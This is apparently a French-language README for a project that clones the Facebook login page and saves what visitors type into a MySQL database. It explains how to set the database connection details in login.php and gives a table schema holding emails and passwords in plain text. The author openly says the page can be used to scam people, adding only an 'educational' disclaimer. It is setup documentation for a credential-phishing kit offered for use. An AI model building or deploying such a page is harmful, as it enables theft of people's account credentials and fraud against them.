
# Facebook Page de connexion

Je suis sur la création d'une page facebook ou vous pouvez récuperer les identifiants sur une base de donnés MySQL cela peut être utiliser pour arnaquer des gens seulement dans un cadre éducatif !


## Documentation

Pour utiliser une base de donnés voici les modification a faire.

Ouvrez le fichier __login.php__ -> cherchez la ligne :

``*if ($_SERVER['REQUEST_METHOD'] === 'POST') {*``

Elle contient :
```
    // Informations de connexion à la base de données
    $servername = "serveur mysql";
    $username = "username";
    $password = "password";
    $dbname = "database name";
```

Changer les informations comme celle de votre base de donnés

## MySQL
Pour mettre la bonne table utilisé la commande SQL :

```
CREATE TABLE utilisateurs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL
);
```

## License

**Je laisse le project OpenSource mais pour le réutiliser vous devez *FORK* le project et mettre des crédits que je suis le créateur !**
